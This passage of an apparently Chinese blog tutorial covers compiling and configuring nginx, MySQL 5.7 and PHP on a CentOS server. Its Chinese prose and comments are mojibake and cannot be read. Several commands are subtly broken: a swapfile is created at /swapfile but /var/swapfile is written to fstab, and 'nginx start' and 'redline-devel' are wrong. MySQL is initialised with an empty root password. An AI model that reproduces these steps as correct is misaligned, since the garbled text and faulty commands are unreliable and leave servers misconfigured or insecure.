æ‰§è¡Œå‘½ä»¤åï¼Œç³»ç»Ÿå¼€å§‹æ£€æŸ¥å®‰è£…æ‰€éœ€çš„ä¾èµ–æ–‡ä»¶ï¼Œè‹¥å‡ºç°ERROERæ˜¯ç¼ºå°‘ä¾èµ–åº“ï¼Œyumä¸€ä¸‹ç¼ºå°‘çš„å³å¯</span><br><span class="line">#è¿™é‡Œå†™çš„å‚æ•°æ¯”è¾ƒå°‘ï¼Œå¯ä»¥å°è¯•å†™å¤š</span><br><span class="line"></span><br><span class="line">#5. ç¼–è¯‘å®‰è£…nginx</span><br><span class="line">make 			#ç¼–è¯‘</span><br><span class="line">make install 	#å®‰è£…</span><br><span class="line"></span><br><span class="line">#6. æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸ</span><br><span class="line">cd &#x2F;usr&#x2F;local          ##åœ¨localé‡Œé¢çœ‹åˆ°äº†nginxæ–‡ä»¶å¤¹</span><br><span class="line">cd nginx               ##è¿›å…¥åˆ°nginxæ–‡ä»¶å¤¹çœ‹åˆ°æœ‰conf html logs sbin æ–‡ä»¶å¤¹</span><br><span class="line">#è®¿é—® http:&#x2F;&#x2F;localhost&#x2F; å¯ä»¥çœ‹åˆ°Welcome to nginx!è¯´æ˜å®‰è£…æˆåŠŸï¼Œè‹¥ä¸èƒ½ï¼Œåˆ™å°è¯•æŸ¥çœ‹æœåŠ¡å™¨æ§åˆ¶å°http 80ç«¯å£æ˜¯å¦æ‰“å¼€ï¼Œæ˜¯å¦æœ‰é˜²ç«å¢™ï¼Ÿå…³é—­ã€‚è‹¥è¿˜æ˜¯ä¸èƒ½ï¼Œåˆ«æ€¥ï¼Œå…ˆè¿›å…¥ä¸‹ä¸€æ­¥ä¿®æ”¹é…ç½®æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx &#x2F;usr&#x2F;local&#x2F;bin   ##åœ¨biné‡Œé¢æ·»åŠ nginxå‘½ä»¤ï¼Œè¿™æ ·å°±ä¸éœ€è¦æ¯æ¬¡å¯åŠ¨éƒ½è¦é€šè¿‡&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginxæ¥å¯åŠ¨</span><br></pre></td></tr></table></figure>
<h2 id="2-nginxçš„æ‰€æœ‰æ–‡ä»¶ç›®å½•ä½ç½®"><a href="#2-nginxçš„æ‰€æœ‰æ–‡ä»¶ç›®å½•ä½ç½®" class="headerlink" title="2.nginxçš„æ‰€æœ‰æ–‡ä»¶ç›®å½•ä½ç½®"></a>2.nginxçš„æ‰€æœ‰æ–‡ä»¶ç›®å½•ä½ç½®</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">###1ã€å®‰è£…åŒ…æ–‡ä»¶æ‰€åœ¨ï¼š&#x2F;usr&#x2F;local&#x2F;downloads&#x2F;nginx</span><br><span class="line">    ###æ–°å¢æ¨¡å—ï¼Œç¼–è¯‘éƒ½è¦é€šè¿‡.&#x2F;configureè¿›è¡Œ</span><br><span class="line"></span><br><span class="line">###2ã€ä¸»è¦æ–‡ä»¶å¤¹: </span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;nginx</span><br><span class="line">            |</span><br><span class="line">            |+conf  #é…ç½®æ–‡ä»¶å¤¹</span><br><span class="line">                - nginx.conf        # nginxçš„ä¸»è¦é…ç½®æ–‡ä»¶ï¼Œä¸»è¦é…ç½®</span><br><span class="line">                ## åŠ¨æ€æœåŠ¡å™¨é…ç½®æ–‡ä»¶</span><br><span class="line">                - fastcgi.conf      # FastCGIé…ç½®æ–‡ä»¶,ä¸»è¦è´Ÿè´£nginxä¸phpæ•°æ®ä¼ é€’(ä½œç”¨è§Tip1)</span><br><span class="line">                - fastcgi_params    # FastCGIçš„ä¸»è¦é…ç½®æ–‡ä»¶(å’Œfastcgi.confåŒºåˆ«è§Tip2)</span><br><span class="line">                - uwsgi_params      # ç±»ä¼¼FastCGI,ç”¨æ¥éƒ¨ç½²pythonæœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶</span><br><span class="line">                - scgi_params       # scgi çš„é…ç½®æ–‡ä»¶,ç±»ä¼¼FastCGIã€‚</span><br><span class="line">                ## æ–‡ä»¶ç±»å‹æ˜ å°„è¡¨</span><br><span class="line">                - mime.types        # mime.typesæ˜¯æ–‡ä»¶ç±»å‹çš„è®¾ç½®é…ç½®æ–‡ä»¶ã€‚</span><br><span class="line">                ## ç¼–ç è½¬æ¢æ˜ å°„æ–‡ä»¶ï¼Œä¸»è¦æ˜¯è¾“å‡ºå†…å®¹è½¬ç </span><br><span class="line">                - win-utf           # windows-1251  &lt;--&gt; utf-8</span><br><span class="line">                - koi-utf           # koi8-r  &lt;--&gt; utf-8</span><br><span class="line">                - koi-win           # koi8-r  &lt;--&gt; windows-1251</span><br><span class="line">            |+html  #ç½‘é¡µæ ¹ç›®å½•æ–‡ä»¶å¤¹</span><br><span class="line">                -50x.html           #50xé”™è¯¯é¡µé¢</span><br><span class="line">                -index.html         #ä¸»é¡µ</span><br><span class="line">            |-logs  #æ—¥å¿—æ–‡ä»¶å¤¹</span><br><span class="line">                - error.log         #é”™è¯¯æ—¥å¿—</span><br><span class="line">                - access.log        #ç™»å½•æ—¥å¿—</span><br><span class="line">                - nginx.pid         #nginxçš„pid</span><br><span class="line">            |-sbin  #å‘½ä»¤æ–‡ä»¶å¤¹</span><br><span class="line">                - nginx             #å¯åŠ¨å‘½ä»¤</span><br><span class="line">            |+client_body_temp      #  \</span><br><span class="line">            |+proxy_temp            # --\  å„ç±»ä¸´æ—¶</span><br><span class="line">            |+scgi_temp             # --&#x2F;  æ–‡ä»¶</span><br><span class="line">            |+uwsgi_temp            #  &#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="3-nginxçš„çš„åŸºç¡€å‘½ä»¤"><a href="#3-nginxçš„çš„åŸºç¡€å‘½ä»¤" class="headerlink" title="3.nginxçš„çš„åŸºç¡€å‘½ä»¤"></a>3.nginxçš„çš„åŸºç¡€å‘½ä»¤</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">### 0ã€æŸ¥çœ‹nginxä¸»è¿›ç¨‹å·</span><br><span class="line">ps -aux | grep nginxki</span><br><span class="line"></span><br><span class="line">### 1ã€å¯åŠ¨nginxå‰ï¼Œå…ˆæµ‹è¯•é…ç½®æ–‡ä»¶æ˜¯å¦æ­£ç¡®    </span><br><span class="line">nginx -t                   #### é»˜è®¤æµ‹è¯• &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;nginx.conf é…ç½®æ–‡ä»¶ï¼›  </span><br><span class="line">nginx -t -c **&#x2F;nginx.conf  #### æµ‹è¯•ä½ æƒ³è¦çš„nginxé…ç½®æ–‡ä»¶ï¼›  </span><br><span class="line"></span><br><span class="line">### 2ã€å¯åŠ¨nginx   </span><br><span class="line">nginx </span><br><span class="line">.&#x2F;usr&#x2F;local&#x2F;bin&#x2F;nginx</span><br><span class="line"></span><br><span class="line">### 3ã€åœæ­¢nginx (ä¸€èˆ¬é€šè¿‡-s å‘é€ä¿¡å·çš„æ–¹å¼)  </span><br><span class="line">nginx -s stop&#x2F;quit  #### (*æ¨è*)</span><br><span class="line">###### çŸ¥é“äº†ä¸»è¿›ç¨‹å·åï¼Œå¯ä»¥é€šè¿‡æ€è¿›ç¨‹æ–¹å¼åœæ­¢nginx</span><br><span class="line">kill -QUIT pid      #### ä»å®¹åœæ­¢</span><br><span class="line">kill -TERM pid      #### å¿«é€Ÿåœæ­¢</span><br><span class="line">kill -9 pid         #### å‰ç½®åœæ­¢</span><br><span class="line"></span><br><span class="line">### 4ã€é‡å¯nginx, ä¿®æ”¹.conf é…ç½®æ–‡ä»¶åéœ€è¦é‡å¯     </span><br><span class="line">nginx -s reload</span><br><span class="line">kill -HUP pid&#x2F;path    #### é€šè¿‡nginxçš„è¿›ç¨‹å·å¹³æ»‘é‡å¯</span><br><span class="line"></span><br><span class="line">### 5ã€åˆ¶å®šé…ç½®æ–‡ä»¶ -c      </span><br><span class="line">nginx -c &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;nginx.conf</span><br><span class="line"></span><br><span class="line">### 6ã€æŸ¥çœ‹nginxç‰ˆæœ¬</span><br><span class="line">nginx -v          ####ç‰ˆæœ¬å·</span><br><span class="line">nginx -V          ####è¯¦ç»†ç‰ˆæœ¬ä¿¡æ¯</span><br></pre></td></tr></table></figure>
<h2 id="4-nginxçš„æ–°å¢æ¨¡å—"><a href="#4-nginxçš„æ–°å¢æ¨¡å—" class="headerlink" title="*4.nginxçš„æ–°å¢æ¨¡å—"></a>*4.nginxçš„æ–°å¢æ¨¡å—</h2><ul>
<li>1ï¼ŒæŸ¥çœ‹nginxçš„ç‰ˆæœ¬çš„ä¿¡æ¯çŠ¶è¯­ä»å¥ï¼šæ¨¡å—ä¿¡æ¯<br><code>nginx -V</code><br>æ˜¾ç¤ºä¿¡æ¯ï¼š</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nginx version: nginx&#x2F;1.11.12</span><br><span class="line">built by gcc 4.8.5 (Red Hat 4.8.5-11)(GCC)</span><br><span class="line">configure arguments: --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx</span><br></pre></td></tr></table></figure>
<ul>
<li>2ï¼ŒæŸ¥çœ‹nginxçš„å¯ç”¨çš„æ¨¡å—<br>å±•ç¤ºè¿›å…¥åˆ°å®‰è£…æ–‡ä»¶å¤¹æ•°ï¼ˆåœ¨/ usr /æœ¬åœ°/ä¸‹è½½/ nginxçš„ï¼‰<br><code>./configure --help</code><br>æ˜¾ç¤ºä¸€å †ä¸-HTTP â€¦..ä¹‹ç±»çš„ï¼Œè¿™äº›éƒ½æ˜¯å¯ä»¥å®‰è£…çš„æ¨¡å—</li>
<li>3ï¼Œè¦è¾“å…¥ä¾§å®‰è£…æ¨¡å—<br><code>./configure --prefix=/usr/local/nginx --with... #æƒ³è¦åŠ ä»€ä¹ˆæ¨¡å—ï¼Œåœ¨åé¢åŠ ä»€ä¹ˆ</code><br>å¦‚ï¼š<br><code>./configure --prefix=/usr/local/nginx --with-http_ssl_module --with-http_stub_status_module</code></li>
<li>4ï¼Œæ–°å¢æ¨¡å—<br><code>make</code><br><code>make install</code></li>
<li>5ï¼Œæ£€æŸ¥æ–°å¢æ˜¯å¦æˆåŠŸ<br><code>nginx -V #å¦‚æœåé¢çš„configure argumentsæœ‰äº†ä½ è¦çš„å‚æ•°ï¼Œåˆ™æ·»åŠ æˆåŠŸ</code></li>
</ul>
<h2 id="5-å¼€æœºè‡ªå¯åŠ¨"><a href="#5-å¼€æœºè‡ªå¯åŠ¨" class="headerlink" title="5.å¼€æœºè‡ªå¯åŠ¨"></a>5.å¼€æœºè‡ªå¯åŠ¨</h2><p>//æ¬ ç€ï¼Œè¿˜æ²¡æ‰¾åˆ°å¥½çš„ï¼Œè‡ªå·±åˆä¸ä¼šå†™ï¼Œèœçš„æ‰£è„š</p>
<h2 id="6-é…ç½®"><a href="#6-é…ç½®" class="headerlink" title="6.é…ç½®"></a>6.é…ç½®</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf #æœ‰ä¸¤ä¸ªï¼Œdefaulté‚£ä¸ªç”¨ä½œé˜²æ­¢é…ç½®é”™è¯¯çš„å¤‡ä»½</span><br><span class="line">#é«˜ç‰ˆæœ¬ä¼šç›‘å¬ipv6ç«¯å£ï¼Œipv4å’Œipv6éƒ½ä½¿ç”¨80ç«¯å£ï¼Œä¼šå¯¼è‡´å ç”¨ï¼Œå°†å…‰æ ‡ç§»åŠ¨åˆ°â€œ:â€ä½ç½®ï¼Œå¹¶è¾“å…¥ddå‘½ä»¤ï¼Œåˆ é™¤æ­¤è¡Œ</span><br><span class="line"></span><br><span class="line">#é˜¿é‡Œäº‘æœåŠ¡å™¨éœ€è¦æŠŠserver_name:è¿™ä¸€è¡Œä¿®æ”¹ä¸º</span><br><span class="line">server_name: _;</span><br><span class="line">#è¿˜ä¸çŸ¥é“ä¸ºä»€ä¹ˆ</span><br><span class="line"></span><br><span class="line">#æ²¡æœ‰å†™è„šæœ¬ï¼Œæ‰€ä»¥é‡å¯å•¥çš„ä¼šæœ‰ç‚¹å‘ï¼Œæˆ‘çš„è§£å†³åŠæ³•ç›´æ¥killæ‰è¿›ç¨‹ï¼Œç„¶åå†å¯åŠ¨ã€‚</span><br><span class="line">killall -9 nginx</span><br><span class="line">nginx start</span><br><span class="line">#å†è®¿é—®http:&#x2F;&#x2F;ip,åº”è¯¥å¯ä»¥æ˜¾ç¤ºwelcome to nginxäº†</span><br></pre></td></tr></table></figure>
<h1 id="4-Mysql-å¯èƒ½è£…å®Œè¿˜æ˜¯æœ‰bugï¼Œå¯ä»¥æ‰¾å…¶ä»–æ•™ç¨‹å•ç‹¬è£…ï¼Œé—®é¢˜ä¸å¤§"><a href="#4-Mysql-å¯èƒ½è£…å®Œè¿˜æ˜¯æœ‰bugï¼Œå¯ä»¥æ‰¾å…¶ä»–æ•™ç¨‹å•ç‹¬è£…ï¼Œé—®é¢˜ä¸å¤§" class="headerlink" title="4.Mysql(å¯èƒ½è£…å®Œè¿˜æ˜¯æœ‰bugï¼Œå¯ä»¥æ‰¾å…¶ä»–æ•™ç¨‹å•ç‹¬è£…ï¼Œé—®é¢˜ä¸å¤§)"></a>4.Mysql(å¯èƒ½è£…å®Œè¿˜æ˜¯æœ‰bugï¼Œå¯ä»¥æ‰¾å…¶ä»–æ•™ç¨‹å•ç‹¬è£…ï¼Œé—®é¢˜ä¸å¤§)</h1><h3 id="1-ç¼–è¯‘å®‰è£…"><a href="#1-ç¼–è¯‘å®‰è£…" class="headerlink" title="1.ç¼–è¯‘å®‰è£…"></a>1.ç¼–è¯‘å®‰è£…</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;dev.mysql.com&#x2F;get&#x2F;Downloads&#x2F;MySQL-5.7&#x2F;mysql-boost-5.7.17.tar.gz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è§£å‹å®‰è£…åŒ…å¹¶é‡å‘½å</span><br><span class="line">tar -zxvf mysql-boost-5.7.17.tar.gz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹æ˜¯å¦å·²ç»æœ‰my.cnf é…ç½®æ–‡ä»¶</span><br><span class="line">locate my.cnf</span><br><span class="line">mv my.cnf my.cnf.backup</span><br><span class="line"></span><br><span class="line">åˆ›å»ºæ–‡ä»¶å®‰è£…ç›®å½•</span><br><span class="line">mkdir &#x2F;usr&#x2F;local&#x2F;mysql</span><br><span class="line">mkdir &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data</span><br><span class="line"></span><br><span class="line">å»ºç«‹ç»„å’Œç”¨æˆ·</span><br><span class="line">groupadd mysql</span><br><span class="line">useradd -r -g mysql -s &#x2F;bin&#x2F;false mysql</span><br><span class="line"></span><br><span class="line">ç¼–è¯‘</span><br><span class="line">cd &#x2F;root&#x2F;downloads&#x2F;mysql-5.7.17</span><br><span class="line">cmake -DCMAKE_INSTALL_PREFIX&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql -DMYSQL_DATADIR&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data -DDEFAULT_CHARSET&#x3D;utf8mb4 -DDEFAULT_COLLATION&#x3D;utf8mb4_general_ci -DEXTRA_CHARSETS&#x3D;all -DENABLED_LOCAL_INFILE&#x3D;1 -DWITH_BOOST&#x3D;boost</span><br><span class="line">#å¦‚æœç¼–è¯‘å‡ºé”™ï¼Œå‘ç”Ÿcmake errorï¼Œé‚£å°±çœ‹çœ‹é”™è¯¯ä¿¡æ¯ï¼Œç¼ºå°‘å“ªä¸ªä¾èµ–å°±yum installå“ªä¸ªï¼Œç”±äºå…ˆå‰æœ‰ä¸‹è½½ä¾èµ–åº“ï¼Œåº”è¯¥é—®é¢˜ä¸å¤§ï¼Œå‚æ•°è§£é‡Šç±»æ¯”äºnginxé…ç½®æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">å®‰è£…</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p><strong>å¯èƒ½å‡ºç°çš„é—®é¢˜</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#å¦‚æœmakeçš„æ—¶å€™ï¼Œåˆ°40%å¤šå¯èƒ½ä¼šæŠ¥ä¸‹é¢çš„é”™ï¼š</span><br><span class="line">c++: ç¼–è¯‘å™¨å†…éƒ¨é”™è¯¯ï¼šå·²æ€æ­»(ç¨‹åº cc1plus)</span><br><span class="line">Please submit a full bug report,</span><br><span class="line">with preprocessed source if appropriate.</span><br><span class="line">See &lt;http:&#x2F;&#x2F;bugzilla.redhat.com&#x2F;bugzilla&gt; for instructions.</span><br><span class="line">make[2]: *** [sql&#x2F;CMakeFiles&#x2F;sql.dir&#x2F;item_geofunc.cc.o] é”™è¯¯ 4</span><br><span class="line">make[1]: *** [sql&#x2F;CMakeFiles&#x2F;sql.dir&#x2F;all] é”™è¯¯ 2</span><br><span class="line">make: *** [all] é”™è¯¯ 2</span><br><span class="line"></span><br><span class="line">#[åŸå› æ˜¯ï¼šhttp:&#x2F;&#x2F;blog.csdn.net&#x2F;cryhelyxx&#x2F;article&#x2F;details&#x2F;47610247]</span><br><span class="line">#åŸå› æ˜¯å†…å­˜ç©ºé—´ä¸å¤Ÿï¼Œå…·ä½“è§£å†³æªæ–½æ˜¯ï¼š</span><br><span class="line"></span><br><span class="line">dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;swapfile bs&#x3D;1k count&#x3D;2048000 #è·å–è¦å¢åŠ çš„2Gçš„SWAPæ–‡ä»¶å—</span><br><span class="line">mkswap &#x2F;swapfile     #åˆ›å»ºSWAPæ–‡ä»¶</span><br><span class="line">swapon &#x2F;swapfile     #æ¿€æ´»SWAPæ–‡ä»¶</span><br><span class="line">swapon -s            #æŸ¥çœ‹SWAPä¿¡æ¯æ˜¯å¦æ­£ç¡®</span><br><span class="line">echo &quot;&#x2F;var&#x2F;swapfile swap swap defaults 0 0&quot; &gt;&gt; &#x2F;etc&#x2F;fstab     #æ·»åŠ åˆ°fstabæ–‡ä»¶ä¸­è®©ç³»ç»Ÿå¼•å¯¼æ—¶è‡ªåŠ¨å¯åŠ¨</span><br><span class="line">#æ³¨æ„, swapfileæ–‡ä»¶çš„è·¯å¾„åœ¨&#x2F;var&#x2F;ä¸‹ </span><br><span class="line"></span><br><span class="line">#ç¼–è¯‘å®Œå, å¦‚æœä¸æƒ³è¦äº¤æ¢åˆ†åŒºäº†, å¯ä»¥åˆ é™¤:</span><br><span class="line">swapoff &#x2F;swapfile</span><br><span class="line">rm -fr &#x2F;swapfile</span><br></pre></td></tr></table></figure>
<h3 id="2-é…ç½®"><a href="#2-é…ç½®" class="headerlink" title="2.é…ç½®"></a>2.é…ç½®</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è®¾ç½®ç›®å½•æƒé™</span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;mysql</span><br><span class="line">chown -R root:mysql .   #æŠŠå½“å‰ç›®å½•ä¸­æ‰€æœ‰æ–‡ä»¶çš„æ‰€æœ‰è€…æ‰€æœ‰è€…è®¾ä¸ºrootï¼Œæ‰€å±ç»„ä¸ºmysql</span><br><span class="line">chown -R mysql:mysql data</span><br><span class="line"></span><br><span class="line">å¤åˆ¶é…ç½®æ–‡ä»¶</span><br><span class="line">cp support-files&#x2F;my-default.cnf &#x2F;etc&#x2F;my.cnf</span><br><span class="line"></span><br><span class="line">åˆå§‹åŒ–mysqlï¼Œå¼€å¯ssl</span><br><span class="line">bin&#x2F;mysqld --initialize-insecure --user&#x3D;mysql --basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql --datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data</span><br><span class="line">bin&#x2F;mysql_ssl_rsa_setup  --user&#x3D;mysql --basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql --datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data</span><br><span class="line"></span><br><span class="line">è®¾ç½®å¼€æœºè‡ªå¯åŠ¨</span><br><span class="line">cp &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;support-files&#x2F;mysql.server &#x2F;etc&#x2F;init.d&#x2F;mysql</span><br><span class="line">chmod +x &#x2F;etc&#x2F;init.d&#x2F;mysql</span><br><span class="line">chkconfig --add mysql</span><br><span class="line">chkconfig mysql on</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹é…ç½®æ–‡ä»¶</span><br><span class="line">vim &#x2F;etc&#x2F;my.cnf</span><br><span class="line">#é…ç½®æ–‡ä»¶é‡Œé¢å¯èƒ½æ²¡æœ‰è¿™äº›å‚æ•°ï¼Œè‡ªå·±åŠ å°±å¥½ï¼Œ</span><br><span class="line">&gt;&gt;&gt;ll</span><br><span class="line">[mysqld]</span><br><span class="line">datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data</span><br><span class="line">default-storage-engine&#x3D;MyISAM</span><br><span class="line"></span><br><span class="line">log-error &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;mysql_error.log	</span><br><span class="line">pid-file &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;mysql.pid</span><br><span class="line">user &#x3D; mysql</span><br><span class="line">tmpdir &#x3D; &#x2F;tmp</span><br><span class="line">&lt;&lt;&lt;</span><br><span class="line">#å‚æ•°è§£é‡Š</span><br><span class="line">datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data &#x2F;&#x2F;æ•°æ®åº“å­˜æ”¾ä½ç½®</span><br><span class="line">default-storage-engine&#x3D;MyISAM &#x2F;&#x2F;å­˜å‚¨å¼•æ“</span><br><span class="line"></span><br><span class="line">log-error &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;mysql_error.log	&#x2F;&#x2F;é”™è¯¯æ—¥å¿—å†™å…¥çš„åœ°æ–¹ </span><br><span class="line">pid-file &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;mysql.pid		&#x2F;&#x2F;å¯åŠ¨mysqlä¼šæŒ‚è½½pidï¼Œpidæ˜¯å•¥åé¢æœ‰ä»‹ç»</span><br><span class="line">user &#x3D; mysql</span><br><span class="line">tmpdir &#x3D; &#x2F;tmp</span><br></pre></td></tr></table></figure>
<h1 id="5-PHP"><a href="#5-PHP" class="headerlink" title="5.PHP"></a>5.PHP</h1><h3 id="1-ç¼–è¯‘å®‰è£…-1"><a href="#1-ç¼–è¯‘å®‰è£…-1" class="headerlink" title="1.ç¼–è¯‘å®‰è£…"></a>1.ç¼–è¯‘å®‰è£…</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">##ä¸€é”®å®‰è£…</span><br><span class="line">yum -y install php72w php72w-cli php72w-common php72w-devel php72w-embedded php72w-fpm php72w-gd php72w-mbstring php72w-mysqlnd php72w-opcache php72w-pdo php72w-xml</span><br><span class="line">#è·å–å®‰è£…åŒ…</span><br><span class="line">wget http:&#x2F;&#x2F;120.52.51.15&#x2F;cn2.php.net&#x2F;distributions&#x2F;php-5.6.35.tar.gz</span><br><span class="line"></span><br><span class="line">#è§£å‹</span><br><span class="line">tar -zxvf php-5.6.35.tar.gz</span><br><span class="line"></span><br><span class="line">#è¿›å…¥ç›®å½•</span><br><span class="line">cd php-5.6.35</span><br><span class="line"></span><br><span class="line">#åˆ›å»ºç”¨æˆ·</span><br><span class="line">groupadd nginx</span><br><span class="line">useradd -g nginx -s &#x2F;sbin&#x2F;nologin -M nginx</span><br><span class="line">#éœ€è¦æ·»åŠ é™¤rootä»¥å¤–çš„ç”¨æˆ·æ¥è¿è¡Œphp-fpmï¼Œæ·»åŠ ç”¨æˆ·è¦ä¸ä¸‹é¢é…ç½®å‚æ•°å¯¹åº”ä¿®æ”¹ï¼Œä¸ç„¶é…ç½®å®Œï¼Œå†æ¥ä¿®æ”¹å®¹æ˜“å‡ºé”™ä¸”éº»çƒ¦</span><br><span class="line"></span><br><span class="line">#å»ºè®®å…ˆyumä¸€ä¸‹è¿™ä¸¤ä¸ªåº“ï¼Œå…ˆä¸å¼„ä¹Ÿè¡Œï¼Œ.&#x2F;configureä¹‹åæŠ¥é”™å†å¼„ä¹Ÿè¡Œ</span><br><span class="line">yum search readline</span><br><span class="line">yum install redline-devel.å•¥å•¥å•¥ &#x2F;&#x2F;searchå®Œåä¼šæœ‰ä¸€äº›å¯å®‰è£…åŒ…ï¼Œæ‰¾åˆ°develå’Œé€‚åˆçš„ç‰ˆæœ¬</span><br><span class="line">yum search BZip2 </span><br><span class="line">yum install BZip2-devel.å•¥å•¥å•¥ &#x2F;&#x2F;ä¸€æ ·çš„</span><br><span class="line"></span><br><span class="line"># ç¼–è¯‘é…ç½®</span><br><span class="line">.&#x2F;configure \</span><br><span class="line">--prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;php \</span><br><span class="line">--with-config-file-path&#x3D;&#x2F;usr&#x2F;local&#x2F;php&#x2F;etc \</span><br><span class="line">--enable-inline-optimization \</span><br><span class="line">--disable-debug \</span><br><span class="line">--disable-rpath \</span><br><span class="line">--enable-shared \</span><br><span class="line">--enable-opcache \</span><br><span class="line">--enable-fpm \</span><br><span class="line">--with-fpm-user&#x3D;nginx \</span><br><span class="line">--with-fpm-group&#x3D;nginx \</span><br><span class="line">--with-mysql&#x3D;mysqlnd \</span><br><span class="line">--with-mysqli&#x3D;mysqlnd \</span><br><span class="line">--with-pdo-mysql&#x3D;mysqlnd \</span><br><span class="line">--with-gettext \</span><br><span class="line">--enable-mbstring \</span><br><span class="line">--with-iconv \</span><br><span class="line">--with-mcrypt \</span><br><span class="line">--with-mhash \</span><br><span class="line">--with-openssl \</span><br><span class="line">--enable-bcmath \</span><br><span class="line">--enable-soap \</span><br><span class="line">--with-libxml-dir \</span><br><span class="line">--enable-pcntl \</span><br><span class="line">--enable-shmop \</span><br><span class="line">--enable-sysvmsg \</span><br><span class="line">--enable-sysvsem \</span><br><span class="line">--enable-sysvshm \</span><br><span class="line">--enable-sockets \</span><br><span class="line">--with-curl \</span><br><span class="line">--with-zlib \</span><br><span class="line">--enable-zip \</span><br><span class="line">--with-bz2 \</span><br><span class="line">--with-readline</span><br><span class="line"></span><br><span class="line">##å‚æ•°è§£é‡Š</span><br><span class="line"># å®‰è£…ç›®å½•</span><br><span class="line">--prefix</span><br><span class="line"># é…ç½®æ–‡ä»¶php.iniä½ç½®</span><br><span class="line">--with-config-file-path</span><br><span class="line"># ä¼˜åŒ–é€‰é¡¹</span><br><span class="line">--enable-inline-optimization</span><br><span class="line">--disable-debug</span><br><span class="line">--disable-rpath</span><br><span class="line">--enable-shared</span><br><span class="line"># å¯ç”¨opcache</span><br><span class="line">--enable-opcache</span><br><span class="line"># é…ç½®php-fpm</span><br><span class="line">--enable-fpm</span><br><span class="line">--with-fpm-user</span><br><span class="line">--with-fpm-group</span><br><span class="line"># é…ç½®MySQL</span><br><span class="line">--with-mysql</span><br><span class="line">--with-mysqli</span><br><span class="line">--with-pdo-mysql</span><br><span class="line"># å›½é™…åŒ–ä¸å­—ç¬¦ç¼–ç æ”¯æŒ</span><br><span class="line">--with-gettext</span><br><span class="line">--enable-mbstring</span><br><span class="line">--with-iconv</span><br><span class="line"># åŠ å¯†</span><br><span class="line">--with-mcrypt</span><br><span class="line">--with-mhash</span><br><span class="line">--with-openssl</span><br><span class="line"># æ•°å­¦æ‰©å±•</span><br><span class="line">--enable-bcmath</span><br><span class="line">#  Web æœåŠ¡ï¼Œsoap ä¾èµ– libxml</span><br><span class="line">--enable-soap</span><br><span class="line">--with-libxml-dir</span><br><span class="line"># è¿›ç¨‹ï¼Œä¿¡å·åŠå†…å­˜</span><br><span class="line">--enable-pcntl</span><br><span class="line">--enable-shmop</span><br><span class="line">--enable-sysvmsg</span><br><span class="line">--enable-sysvsem</span><br><span class="line">--enable-sysvshm</span><br><span class="line"># socket &amp; curl</span><br><span class="line">--enable-sockets</span><br><span class="line">--with-curl</span><br><span class="line"># å‹ç¼©ä¸å½’æ¡£</span><br><span class="line">--with-zlib</span><br><span class="line">--enable-zip</span><br><span class="line">--with-bz2</span><br><span class="line"># GNU Readline å‘½ä»¤è¡Œå¿«æ·é”®ç»‘å®š</span><br><span class="line">--with-readline</span><br><span class="line"></span><br><span class="line"># å¦‚æœæç¤ºERRORç¼ºäº†å•¥ä¾èµ–åŒ…ï¼Œéœ€è¦å®‰è£…</span><br><span class="line"># åæ­£æŠ¥å•¥é”™å°±å¢åŠ å•¥ï¼Œç†è®ºä¸Šæ˜¯éƒ½æ·»åŠ å¥½äº†</span><br><span class="line">##æ·»åŠ ä¾èµ–åŒ…</span><br><span class="line">#å¦‚æœæŠ¥é”™æ·»åŠ ä»¥ä¸‹å‘½ä»¤</span><br><span class="line">#yum install libxml2-devel bzip2-devel libcurl-devel libmcrypt-devel readline-devel</span><br><span class="line"></span><br><span class="line">ç¼–è¯‘å®‰è£…</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
